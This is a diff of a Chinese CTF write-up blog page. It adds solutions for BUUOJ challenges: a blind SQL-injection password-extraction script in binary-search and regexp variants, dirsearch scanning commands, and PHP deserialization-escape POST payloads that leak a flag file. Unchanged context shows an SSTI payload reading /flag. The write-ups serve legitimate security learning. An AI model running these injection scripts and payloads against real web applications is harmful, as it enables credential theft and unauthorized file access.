@@ -27,7 +27,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
   
-    <meta name="keywords" content="Web,CTF," />
+    <meta name="keywords" content="Web,CTF6," />
   
 
   <script>
@@ -426,7 +426,99 @@ for i in xrange(1,50):
 <p><img src="https://i.loli.net/2020/08/14/q39hSr5GMJwzbaC.png" alt="image-20200814124803828"></p>
 <p>最后找到了一个只在MySQL中存在的语句handler</p>
 <p>参考<a href="https://dev.mysql.com/doc/refman/8.0/en/handler.html" target="_blank" rel="noopener">官方文档</a></p>
-<pre><code>?inject=0&#39;; handler FlagHere open;handler FlagHere read first;-- 1</code></pre><h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><h3 id="BJDCTF-2nd-fake-google"><a href="#BJDCTF-2nd-fake-google" class="headerlink" title="[BJDCTF 2nd]fake google"></a>[BJDCTF 2nd]fake google</h3><p>原谅菜鸡的我第一次做这类题目，之前有见到过但是没敢去做，以后没什么敢不敢了，就是肝💪。</p>
+<pre><code>?inject=0&#39;; handler FlagHere open;handler FlagHere read first;-- 1</code></pre><h3 id="BJDCTF-2nd-简单注入"><a href="#BJDCTF-2nd-简单注入" class="headerlink" title="[BJDCTF 2nd]简单注入"></a>[BJDCTF 2nd]简单注入</h3><p>fuzz一下，大概过滤了</p>
+<pre><code>handler
+like
+union
+rand
+mid
+select
+-
+&amp;
+;
+and
+=
+&#39;
+&quot;</code></pre><p>过滤了<code>&#39;</code>，这是没想到的，只能试一下扫目录了</p>
+<p><code>dirsearch</code>扫目录</p>
+<pre><code>python3 dirsearch.py -e php,txt,zip -u http://1ee762b0-b791-4d58-be29-4aea7ed447d8.node3.buuoj.cn/ -s 1
+http://113.31.144.102:24057/
+python3 dirsearch.py -e php,txt,zip -u http://116.85.37.131/574da2df50d5d7ea64621e38a8bd6ad4/</code></pre><p>扫到了<code>robots.txt</code>，访问提示有<code>hint.txt</code>，访问给了sql语句。</p>
+<p><img src="https://i.loli.net/2020/09/03/k5BE1wKoDtxIPFO.png" alt="image-20200903231632385"></p>
+<p>这里用<code>/</code>转义<code>&#39;</code>，然后bool注入即可</p>
+<p>这里直接抄一个二分法脚本</p>
+<pre><code class="python">import requests
+import time
+url = &quot;http://11d3613c-126a-4be9-8b7d-66d26a536094.node3.buuoj.cn/index.php&quot;
+#select * from users where username=&#39;$_POST[&quot;username&quot;]&#39; and password=&#39;$_POST[&quot;password&quot;]&#39;;
+data = {&quot;username&quot;:&quot;\\&quot;,&quot;password&quot;:&quot;&quot;}
+result = &quot;&quot;
+i = 0
+
+while( True ):
+    i = i + 1 
+    head=32
+    tail=127
+
+    while( head &lt; tail ):
+        mid = (head + tail) &gt;&gt; 1
+
+        #payload = &quot;or/**/if(ascii(substr(username,%d,1))&gt;%d,1,0)#&quot;%(i,mid)
+        payload = &quot;or/**/if(ascii(substr(password,%d,1))&gt;%d,1,0)#&quot;%(i,mid)
+
+        data[&#39;password&#39;] = payload
+        time.sleep(0.1)
+        r = requests.post(url,data=data)
+
+        if &quot;stronger&quot; in r.text :
+            head = mid + 1
+        else:
+            tail = mid
+
+    last = result
+
+    if head!=32:
+        result += chr(head)
+    else:
+        break
+    print(result)
+</code></pre>
+<p>也可以使用平常的bool脚本，综合比较一下还是二分法效果好一点。</p>
+<pre><code class="python">import requests
+import time
+
+url =&quot;http://11d3613c-126a-4be9-8b7d-66d26a536094.node3.buuoj.cn/&quot;
+password =&quot;&quot;
+string = [ord(i) for i in &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!_@-&#39;]
+#print (string)
+a = &#39;0x5e&#39;
+
+while(1):
+    for j in string:
+        str = hex(j).replace(&#39;0x&#39;, &#39;&#39;)
+        # 查用户名
+        #username = &quot;or username regexp binary %s #&quot; % (a + str)
+        #print(username)
+        #data = {&quot;username&quot;: &quot;\\&quot;, &quot;password&quot;: username}
+        # 查密码
+        payload = &quot;or password regexp  %s #&quot; % (a + str) 
+        #print(payload)
+        data={&quot;username&quot; :&quot;\\&quot;,&quot;password&quot; : payload }
+        time.sleep(0.1)
+        r = requests.post(url,data=data)
+        #print(r.text)
+        if &quot;stronger&quot; in r.text:
+            password +=chr(j)
+            print(password)
+            a+=str
+            break
+    if &quot;P3rh4ps&quot; in r.text:
+        break
+
+print(password)
+</code></pre>
+<p>得到账号和密码后登陆即可拿到flag。</p>
+<h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><h3 id="BJDCTF-2nd-fake-google"><a href="#BJDCTF-2nd-fake-google" class="headerlink" title="[BJDCTF 2nd]fake google"></a>[BJDCTF 2nd]fake google</h3><p>原谅菜鸡的我第一次做这类题目，之前有见到过但是没敢去做，以后没什么敢不敢了，就是肝💪。</p>
 <p>参考大师傅们的介绍，而且因为这个题目没有任何过滤的样子，最终自己找到了一个payload</p>
 <p><img src="https://i.loli.net/2020/08/12/SqLUYsHxmwCQe4f.png" alt="image-20200812152758837"></p>
 <pre><code class="python">{{().__class__.__bases__[0].__subclasses__()[168].__init__.__globals__.__builtins__['eval']("__import__('os').popen('cat /flag').read()")}}
@@ -743,6 +835,51 @@ public function filter($string) {
 <p>用于过滤的字符只有<code>where</code>与<code>hacker</code>长度不同，又因序列化的操作在过滤之前。如果username中有<code>where</code>被替换成<code>hacker</code>，那么反序列化时的匹配username时就会提前结束1字符，要是我们加上34个<code>where</code>让它提前34个字符结束，那么匹配到的就是</p>
 <p><code>iluem</code>后边我们对photo进行的操作就逃逸出来了。因此我们可以构造</p>
 <pre><code>username[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}</code></pre><p>然后传上去就可以在profile页面拿到<code>config.php</code>的<code>base64encode</code>了。</p>
+<h3 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h3><p>源码如下</p>
+<pre><code class="php">&lt;?php
+
+$function = @$_GET[&#39;f&#39;];
+
+function filter($img){
+    $filter_arr = array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;);
+    $filter = &#39;/&#39;.implode(&#39;|&#39;,$filter_arr).&#39;/i&#39;;
+    return preg_replace($filter,&#39;&#39;,$img);
+}
+
+
+if($_SESSION){
+    unset($_SESSION);
+}
+
+$_SESSION[&quot;user&quot;] = &#39;guest&#39;;
+$_SESSION[&#39;function&#39;] = $function;
+
+extract($_POST);
+
+if(!$function){
+    echo &#39;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#39;;
+}
+
+if(!$_GET[&#39;img_path&#39;]){
+    $_SESSION[&#39;img&#39;] = base64_encode(&#39;guest_img.png&#39;);
+}else{
+    $_SESSION[&#39;img&#39;] = sha1(base64_encode($_GET[&#39;img_path&#39;]));
+}
+
+$serialize_info = filter(serialize($_SESSION));
+
+if($function == &#39;highlight_file&#39;){
+    highlight_file(&#39;index.php&#39;);
+}else if($function == &#39;phpinfo&#39;){
+    eval(&#39;phpinfo();&#39;); //maybe you can find something in here!
+}else if($function == &#39;show_image&#39;){
+    $userinfo = unserialize($serialize_info);
+    echo file_get_contents(base64_decode($userinfo[&#39;img&#39;]));
+}</code></pre>
+<p>和上题几乎一致，同样是反序列化字符逃逸，最近有做过好几道这样的题目，但是还是记录一下</p>
+<p>最终GET传递<code>?f=show_image</code></p>
+<p>POST传递</p>
+<pre><code class="exp">_SESSION[user]=fl1gfl1gfl1gfl1gfl1g&amp;_SESSION[a]=aaa&quot;;s:3:&quot;img&quot;;s:80:&quot;cGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWVuY29kZS9yZXNvdXJjZT0vZDBnM19mbGxsbGxsYWc=&quot;;s:3:&quot;aaa&quot;;s:1:&quot;a&quot;;}</code></pre>
 <h2 id="WAF-Bypass"><a href="#WAF-Bypass" class="headerlink" title="WAF Bypass"></a>WAF Bypass</h2><h3 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="[CISCN 2019 初赛]Love Math"></a>[CISCN 2019 初赛]Love Math</h3><p>源码如下</p>
 <pre><code class="php">&lt;?php
 error_reporting(0);
@@ -820,8 +957,8 @@ ADD HEADER 1:cat /*</code></pre>
           <i class="iconfont icon-06tags"></i>标签: 
           
           <span class="span--tag">
-            <a href="/tags/CTF/">
-              #CTF
+            <a href="/tags/CTF6/">
+              #CTF6
             </a>
           </span>
           
